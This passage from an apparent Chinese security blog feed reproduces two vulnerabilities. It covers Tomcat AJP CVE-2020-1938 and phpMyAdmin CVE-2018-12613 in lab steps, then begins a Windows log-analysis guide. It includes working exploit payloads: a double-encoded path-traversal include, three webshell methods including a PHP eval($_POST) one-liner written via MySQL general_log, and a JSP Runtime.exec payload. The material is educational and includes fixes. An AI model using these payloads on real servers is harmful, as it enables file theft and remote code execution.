<code>Connector</code>，最终返回给客户端。</p><p><strong>那么如何读取其他文件？</strong></p><hr><p><strong>修改POC中的请求url (读取webapps下其他目录的文件)</strong></p><p>前文提到POC中还有个关键参数 <code>reqest_uri</code>，这个参数的设置决定了我们可以读取webapps下指定目录的文件。</p><p>在Poc中，默认的设置值为一个随意字符串’asdf’，其目的是当无法匹配到 webapps下的路径时，会访问tomcat默认的 ROOT 目录（也就是 /webapps/ROOT 文件夹中的文件 ）；同时因为无法查询到 Servlet 这时tomcat将请求流到<code>DefaultServlet</code>，从而触发漏洞。当请求读取 <code>WEB-INF/web.xml</code>文件，则读取的就是<code>webapps/ROOT/WEB-INF/</code>目录下的web.xml。</p><p>因此当我们需要读取 <code>webapps/DeviceManage</code> 目录下的文件时，只需修改POC中 <code>request_uri</code>参数为  <code>DeviceManage/asdf</code>，读取 <code>WEB-INF/web.xml</code>文件则是读取 <code>webapps/manager/WEB-INF/</code>目录下的web.xml。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img11.png"></p><p>综上所述，清楚了整个漏洞流程，我们就可以通过修改Poc读取 webapps下的任意文件了</p><p><strong>漏洞复现（任意文件读取）</strong></p><p>读取 <code>webapps/DeviceManager</code> 目录下的 exec.txt 文件</p><p>修改 Poc 参数内容：</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img12.png"></p><p>payload： <code>python2 CNVD-2020-1938.py IP -p 8009 -f exec.txt</code></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img13.png"></p><h4 id="利用二、文件包含（可执行RCE）"><a href="#利用二、文件包含（可执行RCE）" class="headerlink" title="利用二、文件包含（可执行RCE）"></a>利用二、文件包含（可执行RCE）</h4><p>与之前的任意文件读取不同，请求经过 AjpProcessor 类的处理（走的是JspServlet），随后将请求转发给了 JspServlet，POC中的请求url是.jsp文件，JspServlet 会负责处理所有 JSP 文件的请求。</p><p><strong>漏洞复现（任意文件包含）</strong></p><p>首先在 <code>webapps/DeviceManager</code>目录下新建文件exec.txt，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#打开计算器程序</span><br><span class="line">&lt;%Runtime.getRuntime().exec(&quot;calc.exe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>修改 Poc 参数内容：</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img14.png"></p><p>payload： <code>python2 CNVD-2020-1938.py IP -p 8009 -f exec.txt</code></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/25/cve-2020-1938-img15.png"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>1.如未使用Tomcat AJP协议：</strong></p><p>如未使用 Tomcat AJP 协议，可以直接将 Tomcat升级到 9.0.31、8.5.51或7.0.100版本进行漏洞修复。</p><p>如无法立即进行版本更新、或者是更老版本的用户，建议直接关闭 AJPConnector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作：</p><p>（1）编辑 <code>&lt;CATALINA_BASE&gt;/conf/server.xml</code>，找到如下行（<CATALINA_BASE>为Tomcat的工作目录）：</p><p>&lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443” /&gt;</p><p>（2）将此行注释掉（也可删掉该行）：</p><!--<Connectorport="8009" protocol="AJP/1.3"redirectPort="8443" />--><p>（3）保存后需重新启动，规则方可生效。</p><p><strong>2.如果使用了Tomcat AJP协议：</strong></p><p>建议将Tomcat立即升级到9.0.31、8.5.51或7.0.100版本进行修复，同时为 AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将 YOUR_TOMCAT_AJP_SECRET 更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8009&quot;protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot;address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>如无法立即进行版本更新、或者是更老版本的用户，建议为 AJPConnector配置 requiredSecret 来设置 AJP 协议认证凭证。例如（注意必须将 YOUR_TOMCAT_AJP_SECRET 更改为一个安全性高、无法被轻易猜解的值）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8009&quot;protocol&#x3D;&quot;AJP&#x2F;1.3&quot; redirectPort&#x3D;&quot;8443&quot;address&#x3D;&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret&#x3D;&quot;YOUR_TOMCAT_AJP_SECRET&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/7683">https://xz.aliyun.com/t/7683</a></p><p><a href="https://l3yx.github.io/2020/03/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">https://l3yx.github.io/2020/03/26/Tomcat-Ajp协议漏洞/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;apache-Tomcat-文件包含漏洞（CVE-2020-1938）&quot;&gt;&lt;a href=&quot;#apache-Tomcat-文件包含漏洞（CVE-2020-1938）&quot; class=&quot;headerlink&quot; title=&quot;apache Tomcat 文件包含漏洞（C</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin文件包含漏洞复现（CVE-2018-12613）</title>
    <link href="http://example.com/2021/05/17/tag/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2018-12613)/"/>
    <id>http://example.com/2021/05/17/tag/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2018-12613)/</id>
    <published>2021-05-16T22:00:00.000Z</published>
    <updated>2021-05-24T13:34:23.280Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phpmyadmin文件包含漏洞复现（CVE-2018-12613）"><a href="#phpmyadmin文件包含漏洞复现（CVE-2018-12613）" class="headerlink" title="phpmyadmin文件包含漏洞复现（CVE-2018-12613）"></a>phpmyadmin文件包含漏洞复现（CVE-2018-12613）</h2><h3 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h3><p><strong>漏洞编号</strong>：CVE-2018-12613</p><p><strong>漏洞简介</strong>：phpMyAdmin 是一套开源的、基于Web的 MySQL数据库管理工具。其 index.php 中存在一处文件包含逻辑，通过二次编码可以绕过检查，造成任意文件包含漏洞，可获取 webshell。</p><p><strong>影响范围</strong>：phpmyadmin 4.8.0-4.8.2</p><p><strong>运行环境</strong>：winodws+phpstudy集成环境</p><h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>需要先登录 phpmyadmin 并访问主页</p><p>执行payload： <code>index.php?target=db_datadict.php%253f/../../../../../Windows/system.ini</code></p><p>返回如下信息，成功执行文件包含</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png"></p><h3 id="0x03-漏洞细节"><a href="#0x03-漏洞细节" class="headerlink" title="0x03 漏洞细节"></a>0x03 漏洞细节</h3><p>该漏洞主要问题出现在 index.php 55-63行处，代码审计可知：</p><ul><li>通过 include() 包含 target 参数</li><li>利用正则限制 target参数不能存在index</li><li>限制target为非 back_list 参数值（黑名单是一切骚操作的开始）</li><li>自定义函数 <code>checkPageValidity</code> 为True</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码对$target_backlist 的定义在 50-52 行 ，可以发现它的限制是非常少的，只要不是 import.php 和 export.php 就行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>对于第四个判断  <code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code> 的代码在文件 libraries\classes\Core.php 443-476行处：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>一共有5个if判断</strong></p><ul><li>变量 $whitelist 是否为空，为空则引用静态声明的 $gotowhitelist</li><li>是否定义变量 page 且为字符串 返回 True</li><li>$page 存在 $whitelist 中的某个值则返回 True</li><li>$_page 存在 $whitelist 中的某个值则返回 True</li><li>经过 urldecode  函数解码后的 $_page 存在 $whitelist 中的某个值则返回 True</li></ul><p><strong>第一个判断：</strong></p><p>直接将 $gotowhitelist 数组赋给了 $whitelist</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span></span><br><span class="line">.......</span><br><span class="line"><span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>第二个判断</strong> 肯定是True，没什么问题跳过。</p><p><strong>第三个判断：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>判断$page变量值在 $whitelist 数组中是否存在</p><p><strong>第三个判断：</strong></p><p>严谨的 phpmyadmin的开发团队为了防止 target 值后面跟上了其他参数（出现逻辑上的错误）保证能正常包含文件，又做了一次检查，先进行了一次url解码，然后使用<code>mb_substr</code> 和 <code>mb_strpose</code> 。以 ? 分割，获取前面的字符串做为 $_page 变量值，判断其是否存在 $whitelist 数组中。</p><p>但这里的判断导致其出现了问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>先对$page 进行了 <strong>url解码</strong>，再利用<strong>？标志</strong> 分割出值进行判断。</p><p>假设我们传入的payload：<code>target=db_sql.php%253f/../../../../etc/passwd</code>  </p><p><code>%253f</code> 是 <code>?</code>  的二次URL编码。$page urldecode后就变成了<code>db_sql.php?/../../../../etc/passwd</code> </p><p>因此index.php 的第四个判断 <code>Core::checkPageValidity($_REQUEST[&#39;target&#39;])</code> 也返回了Ture。</p><p>总结以上的各种逻辑绕过，于是我们通过URL二次编码就直接绕过了它的检测返回 True 并成功的实现了任意文件包含。</p><h3 id="0x04-漏洞Getshell"><a href="#0x04-漏洞Getshell" class="headerlink" title="0x04 漏洞Getshell"></a>0x04 漏洞Getshell</h3><p>目前有三种方式：</p><p><strong>方法一、创建数据库和表，写shell</strong></p><p>1、创建一个 <code>text</code> 数据库，表名为 <code>shell</code> ,将shell写入列名</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img2.png"></p><p>2、在控制台获取数据库的绝对路径 <code>SELECT @@datadir</code></p><p>其 webshell 的网站相对路径： <code>path/text/shell.frm</code></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img3.png"></p><p>3、文件包含数据库文件 getshell</p><p>payload： <code>?target=db_datadict.php%253f/../../../Extensions\MySQL5.7.26\data\test\shell.frm</code></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img4.png"></p><p>成功包含，可以直接写入一句话getshll。</p><p><strong>方法二、开启general_log，日志Getshell</strong></p><p>MySQL5.0版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，再通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而GetShell。但是前提是要对生成的日志文件有读写权限。</p><p>查询日志信息： <code>show variables like &#39;%general%&#39;</code></p><p>general_log：日志保存状态</p><p>general_log_file：日志保存路径</p><p>开启日志保存并配置保存路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;    -- 打开日志保存</span><br><span class="line">set global general_log_file &#x3D; &quot;E:&#x2F;phpstudy&#x2F;WWW&#x2F;log.php&quot;;  -- 设置日志保存路径,需先得知网站物理路径,否则即使写入了Shell也无法通过URL连接</span><br></pre></td></tr></table></figure><p>写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure><p><strong>方法三、写入session文件包含webshell（推荐）</strong></p><p>在 SQL 控制台 中执行   <code>select &#39;要执行的代码&#39;</code></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img5.png"></p><p>其代码操作会存入服务器端的session文件（服务器为了标记用户，对每个访问用户标识了一个唯一session值，并以文件的形式记录用户信息存放在服务器中）。</p><p>一般情况下，session文件存放位置：</p><p><strong>Linux：</strong> /tmp 或 /var/lib/php/session</p><p><strong>Windows：</strong> C:\WINDOWS\Temp</p><p>文件名为   <code>&quot;sess_&quot; + &quot;session值&quot;</code>  ，session值可以通过浏览器的F12 查询 。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img6.png"></p><p>但 sesion 文件路径具体情况还是得具体分析，比如集成环境搭建的路径就集成在了独立的环境中。</p><p>例如：我的环境是 phpstudy，其存储路径为：Phpstudy的安装目录下。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img7.png"></p><p><strong>PS：SESSION 文件保存的目录由 <code>php.ini</code> 配置文件 <code>session.save_path= xxx</code>  参数设置</strong></p><p>于是通过payload：<code>?target=db_datadict.php%253f/../../../Extensions/tmp/tmp/sess_fgeda0ibfi693iscj1inrs2lvpjg71i7</code></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img8.png"></p><h3 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05 修复建议"></a>0x05 修复建议</h3><p>如果在不影响正常业务的情况下，建议直接更新到最新版。</p><p>该漏洞在发布不久后，官方就立马修复了，通过git changelog 可以查看官方如何修复漏洞的。查看补丁源码，<a href="https://github.com/phpmyadmin/phpmyadmin/commit/d1360f46cef76c5182116eb2b8fdbab1b20e687a">URL链接</a>：</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img9.png" alt="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png%208.png"></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img10.png" alt="https://www.kro1lsec.com:442/images/2021/05/24/CVE-2018-12613-img1.png%209.png"></p><p>其修复方案似乎有点简单粗暴，直接加了个<code>$include= false</code>，跳过了第二次的 $_page检测，仅执行第一次判断 $_page的合法性，因此也无法进入urldecode 的步骤了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;phpmyadmin文件包含漏洞复现（CVE-2018-12613）&quot;&gt;&lt;a href=&quot;#phpmyadmin文件包含漏洞复现（CVE-2018-12613）&quot; class=&quot;headerlink&quot; title=&quot;phpmyadmin文件包含漏洞复现（CVE-2</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>日志分析</title>
    <link href="http://example.com/2021/04/30/Blue/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2021/04/30/Blue/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</id>
    <published>2021-04-29T18:39:49.000Z</published>
    <updated>2021-04-29T12:40:30.731Z</updated>
    
    <content type="html"><![CDATA[<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>概述：将主机系统安全日志/操作日志、网络设备流量日志、Web应用访问日志、SQL应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。</p><p><strong>目的</strong></p><p>（1）<strong>网站安全自检查</strong>，了解服务器上正在发生的安全事件。</p><p>（2）应急事件中的<strong>分析取证</strong>。</p><h2 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>简介：Windows系统日志是记录系<strong>统中硬件、软件和系统问题</strong>的信息，同时还可以<strong>监视系统中发生的事件</strong>。用户可以通过它来<strong>检查错误发生的原因</strong>，或者<strong>寻找受到攻击时</strong>攻击者留下的痕迹。</p><h4 id="常用日志"><a href="#常用日志" class="headerlink" title="常用日志"></a>常用日志</h4><p>Windows主要<strong>三类日志记录</strong>系统事件</p><ul><li><strong>应用程序日志</strong></li><li><strong>系统日志</strong></li><li><strong>安全日志</strong></li></ul><p><strong>系统日志</strong></p><p>记录<strong>操作系统组件产生的事件</strong>，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><p>记录由<strong>应用程序或系统程序产生的事件</strong>，主要记录程序运行方面的事件，例如数据库程序文件错误，程序开发人员可以自行决定监视哪些事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><p>记录<strong>系统的安全审计事件</strong>，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。<strong>默认设置下，安全性日志关闭，</strong>管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p><strong>对于系统管理员而言</strong>：</p><p>系统和应用程序日志存储着故障排除信息，更为有用。</p><p><strong>对于调查人员而言</strong>：</p><p>安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么</p><h4 id="审核策略-事件查看器"><a href="#审核策略-事件查看器" class="headerlink" title="审核策略/事件查看器"></a>审核策略/事件查看器</h4><ul><li>运行 <code>secpol.msc</code> 打开本地安全策略</li><li>运行 <code>eventvwr.msc</code> 打开事件查看器</li></ul><p><strong>审核策略</strong></p><p>开启审核策略。<strong>用于记录信息</strong>，系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略</p><p><strong>事件查看器</strong></p><p>用于方便查看日志事件信息。</p><h4 id="事件日志分析"><a href="#事件日志分析" class="headerlink" title="事件日志分析"></a>事件日志分析</h4><p>因为日志分析是一个庞大的工程量，通过一些关键信息来方便分析</p><ul><li>使用筛选器查看安全日志的<strong>事件ID</strong>（例如登录事件）</li><li></li></ul><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th align="left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td align="left">4624</td><td>登录成功</td></tr><tr><td align="left">4625</td><td>登录失败</td></tr><tr><td align="left">4634</td><td>注销成功</td></tr><tr><td align="left">4647</td><td>用户启动的注销</td></tr><tr><td align="left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型（详细信息-LoginType），一般2 5 7 都正常</p><p>不同登录类型代表不同的方式：</p><table><thead><tr><th align="left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td align="left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td align="left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td align="left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><h4 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h4><ul><li><p>事件日志查看器</p></li><li><p>Microsoft LogParser</p></li><li><p>Log Parser Lizard</p></li><li><p>Event Log Explorer</p></li></ul><p><strong>Log Parser</strong></p><p>概述：使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。</p><p>它使用类似于 SQL 语句的命令查询分析这些数据</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><strong>基本查询结构</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;</span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where 